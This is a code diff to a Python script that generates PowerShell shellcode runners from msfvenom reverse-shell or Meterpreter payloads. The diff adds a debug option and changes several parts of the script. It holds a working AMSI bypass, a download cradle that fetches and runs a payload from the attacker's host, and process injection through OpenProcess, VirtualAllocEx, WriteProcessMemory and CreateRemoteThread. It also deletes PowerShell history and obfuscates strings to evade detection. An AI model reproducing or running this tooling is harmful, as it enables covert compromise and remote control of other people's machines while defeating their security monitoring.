@@ -50,6 +50,7 @@ if __name__ == '__main__':
 	parser.add_argument('-keyhost', action='store', help='Specify webserver ip/address that key will be hosted on and key name (example: 192.168.1.1 or www.mydomain.com)')
 	parser.add_argument('-key', action='store', metavar="file.txt", help='Key output file. Use in conjunction with -keyhost.')
 	parser.add_argument('-M', action='store_true', help='Use default Meterpreter payload (windows/x64/meterpreter/reverse_tcp)')
+	parser.add_argument('-D', action='store_true', help='Include debug statements in payload')
 	parser.add_argument('-p', action='store', metavar="payload", help='Specify msfvenom payload (default: windows/x64/shell_reverse_tcp)')
 	parser.add_argument('-switches', action='store', metavar="options", help='Extra msfvenom switches like encoder, rounds. Enter in quotes and do not use -o or -f! (default: -e x64/xor_dynamic)')
 	
@@ -70,7 +71,7 @@ if __name__ == '__main__':
 	else:
 		payloadfile = "payload.txt"
 	if args.execution_method == "ps":
-		remhistory = "$file = \"$Env:APPDATA\Microsoft\Windows\Powershell\PSReadLine\ConsoleHost_history.txt\";Get-Content $file | Measure-Object -Line;$a = (Get-Content $file | Measure-Object);(Get-Content $file) | ? {($a.count)-notcontains $_.ReadCount} | Set-Content $file"
+		remhistory = "Remove-Item \"$Env:APPDATA\Microsoft\Windows\Powershell\PSReadLine\ConsoleHost_history.txt\" -ErrorAction SilentlyContinue"
 	elif args.execution_method == "cmd":
 		remhistory = ""
 		stager = True
@@ -78,10 +79,10 @@ if __name__ == '__main__':
 		print("Invalid selection.  Choose either 'cmd' for cmd.exe or 'ps' for powershell.exe")
 		sys.exit(0)
 	if args.integrity == "M":
-		pidfinder = "$procid=(get-process " + args.process + " | where-object CPU -GT 0)[0].id"
+		pidfinder = "$procs=(get-process "+args.process+")"# | where-object CPU -GT 0);if($procs.Count -eq 0){$procs=(get-process "+args.process+")}"
 		integprint = "Medium"
 	elif args.integrity == "H":
-		pidfinder = "$procid=(get-process " + args.process + ")[0].id"
+		pidfinder = "$procs=(get-process "+args.process+")"
 		integprint = "High"
 	else:
 		print("Invalid integrity level selected, select either 'M' for medium or 'H' for high")
@@ -123,7 +124,7 @@ if __name__ == '__main__':
 		cradle = "iex (new-object net.webclient).downloadstring('http://" + args.lhost + "/" + payloadfile + "')"
 
 	# Patch 1st 4 bytes of AmsiContext struct for the PS process. Does not fail if no AmsiContext buffer is found (Amsi not active)
-	amsiBypass = """$a=[Ref].Assembly.GetTypes();Foreach($b in $a){if($b.Name -like \"*iUtils\"){$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d){if($e.Name -like \"*Context\") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);if($ptr -ne 0){[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)}"""
+	amsiBypass = """$a=[Ref].Assembly.GetTypes();Foreach($b in $a){if($b.Name -like \"*iUtils\"){$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d){if($e.Name -like \"*Context\") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);if($ptr -ne 0){if($my_dbg){Write-Host \"[+] Found 4m5iCtx\"};[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1);if($my_dbg){Write-Host \"[+] Overwrote 4m5iCtx\"}}"""
 	# re-execute in 64-bit powershell if running in a 32-bit process on a 64-bit machine
 	migrate64="""if($env:PROCESSOR_ARCHITEW6432 -eq "AMD64"){ &"$env:WINDIR\\sysnative\\windowspowershell\\v1.0\\powershell.exe" -Exec bypass -NonInteractive -NoProfile \"""" + cradle + "\"}"
 
@@ -152,7 +153,11 @@ if __name__ == '__main__':
 		print("Runner written to " + stagerfile + "!")
 	print("\nGenerating runner...")
 	
-	runner = """function LookupFunc {
+	if args.D:
+		runner = "$my_dbg=$true\n"
+	else:
+		runner = "$my_dbg=$false\n"
+	runner += """function LookupFunc {
  Param ($moduleName, $functionName)
  $assem = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
  $tmp=@()
@@ -189,17 +194,23 @@ if ( $finishtime -le $starttime.addseconds(4.5) ) {
 """ + key + """
 
 [Byte[]] $buf = getStrawberries $key
- 
+
 """ + pidfinder + """
- 
-$hprocess = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll OpenProcess), (getDelegateType @([UInt32], [bool], [UInt32])([IntPtr]))).Invoke(0x001F0FFF, $false, $procid)
- 
+ForEach($proc in $procs){
+ $hprocess = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll OpenProcess), (getDelegateType @([UInt32], [bool], [UInt32])([IntPtr]))).Invoke(0x001F0FFF, $false, $proc.Id)
+ if($hprocess -ne 0){if($my_dbg){Write-Host \"[+] Successfully opened $($proc.id)\";};break;}
+}
+if($hprocess -eq 0 -and $my_dbg){Write-Host "[-] Unable to OpenProcess"}
+
 $addr= [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualAllocEx), (getDelegateType @([IntPtr], [IntPtr], [UInt32], [UInt32], [UInt32])([IntPtr]))).Invoke($hprocess, [IntPtr]::Zero, 0x1000, 0x3000, 0x40)
- 
+if($my_dbg){if($addr -ne 0){Write-Host \"[+] Successfully got Mem\"}else{Write-Host \"[-] Unable to get Mem\"}}
+
 [Int32]$lpNumberOfBytesWritten = 0
-[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll WriteProcessMemory), (getDelegateType @([IntPtr], [IntPtr], [Byte[]], [UInt32], [UInt32].MakeByRefType())([bool]))).Invoke($hprocess, $addr, $buf, $buf.length, [ref]$lpNumberOfBytesWritten)
- 
-[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll CreateRemoteThread), (getDelegateType @([IntPtr], [IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr])([IntPtr]))).Invoke($hprocess,[IntPtr]::Zero,0,$addr,[IntPtr]::Zero,0,[IntPtr]::Zero)
+$ret=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll WriteProcessMemory), (getDelegateType @([IntPtr], [IntPtr], [Byte[]], [UInt32], [UInt32].MakeByRefType())([bool]))).Invoke($hprocess, $addr, $buf, $buf.length, [ref]$lpNumberOfBytesWritten)
+if($my_dbg){if($ret){Write-Host \"[+] Successfully wrote Mem\"}else{Write-Host \"[-] Unable to write Mem\"}}
+
+$ret=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll CreateRemoteThread), (getDelegateType @([IntPtr], [IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr])([IntPtr]))).Invoke($hprocess,[IntPtr]::Zero,0,$addr,[IntPtr]::Zero,0,[IntPtr]::Zero)
+if($my_dbg){if($ret -ne 0){Write-Host \\"[+] Successfully made thr34d\"}else{Write-Host \"[-] Unable to create thr34d\"}}
 """ + remhistory
 	with open(payloadfile,"w") as f:
 		f.write(runner)
